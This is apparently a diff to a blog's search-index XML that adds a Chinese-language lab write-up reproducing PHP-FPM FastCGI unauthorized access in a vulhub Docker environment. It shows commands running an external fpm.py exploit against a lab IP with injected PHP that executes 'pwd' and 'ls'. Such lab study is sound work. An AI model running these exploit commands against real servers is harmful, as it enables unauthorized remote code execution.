@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>PHP-FPM Fastcgi未授权访问漏洞</title>
+      <link href="/2022/05/05/php-fpm-fastcgi/"/>
+      <url>/2022/05/05/php-fpm-fastcgi/</url>
+      
+        <content type="html"><![CDATA[<h1 id="PHP-FPM-Fastcgi未授权访问漏洞"><a href="#PHP-FPM-Fastcgi未授权访问漏洞" class="headerlink" title="PHP-FPM Fastcgi未授权访问漏洞"></a>PHP-FPM Fastcgi未授权访问漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/fpmdocker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><p>下载上面的那玩意</p><p>然后利用</p><pre class=" language-Linux"><code class="language-Linux">python fpm.py 192.168.3.151 /usr/local/lib/php/PEAR.php</code></pre><p><img src="/2022/05/05/php-fpm-fastcgi/image-20220505210059370.png" alt="image-20220505210059370"></p><p>任意命令执行</p><pre class=" language-Linux"><code class="language-Linux">python fpm.py 192.168.3.151 /usr/local/lib/php/PEAR.php -c '<?php echo `pwd`;?>'</code></pre><p><img src="/2022/05/05/php-fpm-fastcgi/image-20220505210153531.png" alt="image-20220505210153531"></p><pre class=" language-Linux"><code class="language-Linux">python fpm.py 192.168.3.151 /usr/local/lib/php/PEAR.php -c '<?php echo `ls`;?>' </code></pre><p><img src="/2022/05/05/php-fpm-fastcgi/image-20220505210218025.png" alt="image-20220505210218025"></p><p>结束！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> CVE </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> PHP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PHP-FPM远程代码执行漏洞(CVE-2019-11043)</title>
       <link href="/2022/05/05/php-fpm/"/>
       <url>/2022/05/05/php-fpm/</url>
